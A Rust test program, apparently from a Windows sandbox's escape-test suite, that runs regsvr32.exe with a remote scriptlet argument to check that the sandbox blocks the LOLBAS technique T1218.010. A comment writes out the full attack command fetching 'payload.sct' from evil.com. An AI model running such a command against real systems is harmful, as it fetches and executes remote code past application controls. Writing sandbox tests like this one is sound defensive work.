// escape_lolbas_regsvr32 — tries to use regsvr32.exe to execute code.
// regsvr32 loads a COM DLL and calls DllRegisterServer. If the DLL
// contains malicious code, it executes with regsvr32's context.
// Our hooks should prevent: the child process gets hook.dll injected,
// content scan catches syscall instructions, COM activation blocked.
//
// For testing: we just verify regsvr32 runs sandboxed (exit code check).
// Real attack would require crafting a malicious DLL.

fn main() {
    eprintln!("[escape_lolbas_regsvr32] starting");

    // Try to run regsvr32 /s /n /i:http://evil.com/payload.sct scrobj.dll
    // This is a real LOLBAS technique (T1218.010).
    // In sandbox: NtCreateUserProcess hook catches child spawn → injects hook.dll.
    // alpc_guard blocks COM activation → regsvr32 can't activate scrobj.dll.
    // Use full path to avoid PATH resolution issues inside sandbox
    let regsvr = r"C:\Windows\System32\regsvr32.exe";
    let output = std::process::Command::new(regsvr)
        .args(["/s", "/n", "/i:http://127.0.0.1:1/test.sct", "scrobj.dll"])
        .output();

    match output {
        Ok(o) => {
            let code = o.status.code().unwrap_or(-1);
            eprintln!("[escape_lolbas_regsvr32] regsvr32 exit={code}");
            // Any non-zero exit means regsvr32 failed (expected — scrobj.dll
            // can't activate COM). If exit 0 with real SCT → escape worked.
            if code == 0 {
                eprintln!("[escape_lolbas_regsvr32] WARNING: regsvr32 exit 0");
                std::process::exit(0);
            }
            std::process::exit(5); // blocked
        }
        Err(e) => {
            eprintln!("[escape_lolbas_regsvr32] failed to spawn: {e}");
            std::process::exit(5);
        }
    }
}
